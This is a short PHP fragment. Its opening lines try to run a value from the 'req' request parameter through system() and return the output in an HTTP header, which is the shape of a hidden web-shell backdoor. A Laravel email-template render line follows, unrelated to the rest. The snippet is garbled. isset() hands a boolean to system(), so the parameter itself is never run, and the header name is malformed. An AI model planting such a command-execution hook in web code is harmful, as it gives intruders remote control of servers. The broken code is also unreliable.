<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

echo View::make('emails.template')->with('message', $body)->render();